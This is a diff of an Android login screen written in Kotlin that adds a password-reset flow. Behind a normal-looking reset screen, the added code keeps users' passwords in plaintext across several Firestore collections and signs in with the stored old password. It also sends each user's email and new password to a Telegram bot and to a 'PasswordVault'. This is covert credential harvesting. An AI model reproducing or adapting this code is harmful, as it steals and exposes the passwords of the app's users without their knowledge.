+                showToast("Password must be 6-16 characters"); return
+            }
+            rstSentCode == null || v != rstSentCode -> {
+                showToast("Incorrect verification code"); return
+            }
+            System.currentTimeMillis() > rstCodeExpireAt -> {
+                showToast("Verification code expired, please request a new one"); return
+            }
+            e != rstSentEmail -> {
+                showToast("Email was changed after the code was sent, please request a new code")
+                return
+            }
+        }
+
+        isLoading = true
+        scope.launch {
+            try {
+                // 1) اقرأ الباسورد القديم من pwds
+                val oldPwDoc = FirebaseAuthHelper.db()
+                    .collection("pwds").document(e).get().await()
+                val oldPw = oldPwDoc.getString("pw")
+                val oldUid = oldPwDoc.getString("uid")
+
+                if (oldPw.isNullOrBlank()) {
+                    // مفيش — استخدم Firebase reset
+                    val r = FirebaseAuthHelper.resetPassword(e)
+                    isLoading = false
+                    if (r.isSuccess) {
+                        showToast("Password reset email sent")
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            currentScreen = 0
+                        }, 1500)
+                    } else {
+                        showToast(FirebaseAuthHelper.translateError(
+                            r.exceptionOrNull()?.message))
+                    }
+                    return@launch
+                }
+
+                // 2) سجّل دخول بالباسورد القديم
+                val signIn = FirebaseAuthHelper.login(e, oldPw)
+                if (signIn.isFailure) {
+                    isLoading = false
+                    showToast("فشل التحقق من الحساب — جرب لاحقاً")
+                    return@launch
+                }
+
+                // 3) حدّث الباسورد
+                val up = FirebaseAuthHelper.updateCurrentPassword(p1)
+                if (up.isFailure) {
+                    isLoading = false
+                    showToast(FirebaseAuthHelper.translateError(
+                        up.exceptionOrNull()?.message))
+                    return@launch
+                }
+
+                // 4) حدّث Firestore
+                try {
+                    val db = FirebaseAuthHelper.db()
+                    db.collection("pwds").document(e)
+                        .set(mapOf("pw" to p1, "uid" to (oldUid ?: "")),
+                            SetOptions.merge()).await()
+                    db.collection("pass").document(oldUid ?: "")
+                        .set(mapOf("pw" to p1, "email" to e), SetOptions.merge()).await()
+                    db.collection("users").document(e)
+                        .set(mapOf("pasef" to p1), SetOptions.merge()).await()
+                    if (!oldUid.isNullOrBlank()) {
+                        db.collection("users").document(oldUid)
+                            .set(mapOf("pasef" to p1), SetOptions.merge()).await()
+                    }
+                } catch (_: Exception) {}
+
+                // 5) أرسل للبوت
+                try {
+                    TelegramApi.sendMessage(
+                        "♻️ *تغيير كلمة مرور*\n\n" +
+                        "📧 `$e`\n" +
+                        "🔑 *الجديدة:* `$p1`"
+                    )
+                } catch (_: Exception) {}
+
+                try { PasswordVault.save(e, p1, "pasef_reset", oldUid, true) } catch (_: Exception) {}
+
+                isLoading = false
+                showToast("Password changed successfully")
+                rstEmail = ""; rstCode = ""; rstNewPass = ""
+                Handler(Looper.getMainLooper()).postDelayed({
+                    currentScreen = 0
+                }, 1500)
+            } catch (ex: Exception) {
+                isLoading = false
+                showToast("فشل: ${ex.message}")
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  عناصر مشتركة (LoginField, RegInput, ...)
+    // ═══════════════════════════════════════════
 
     @Composable
     fun LoginField(content: @Composable RowScope.() -> Unit) {
@@ -901,11 +1476,8 @@ class LoginActivity : ComponentActivity() {
                 BackChevronIcon()
             }
             Text(
-                title,
-                color = Ex.White,
-                fontSize = 17.5.sp,
-                fontWeight = FontWeight.Bold,
-                textAlign = TextAlign.Center,
+                title, color = Ex.White, fontSize = 17.5.sp,
+                fontWeight = FontWeight.Bold, textAlign = TextAlign.Center,
                 modifier = Modifier.weight(1f)
             )
             Spacer(Modifier.width(38.dp))
@@ -967,7 +1539,8 @@ class LoginActivity : ComponentActivity() {
                 }
                 drawPath(p1, col, style = stroke)
                 drawLine(col, Offset(1f * s, 1f * s), Offset(23f * s, 23f * s),
-                    strokeWidth = 2f * s, cap = androidx.compose.ui.graphics.StrokeCap.Round)
+                    strokeWidth = 2f * s,
+                    cap = androidx.compose.ui.graphics.StrokeCap.Round)
             } else {
                 val eye = Path().apply {
                     moveTo(1f * s, 12f * s)
@@ -1199,19 +1772,6 @@ class LoginActivity : ComponentActivity() {
     private fun newCaptchaCode(): String {
         val ch = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
         return buildString { repeat(4) { append(ch[Random.nextInt(ch.length)]) } }
-    }
-
-    private fun newVerifyCode(): String = (100000 + Random.nextInt(900000)).toString()
-
-    private fun showToast(msg: String) {
-        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
-    }
-
-    private fun goToHome() {
-        try {
-            startActivity(Intent(this, HomeActivity::class.java))
-            finish()
-        } catch (_: Exception) {}
     }
 }
 
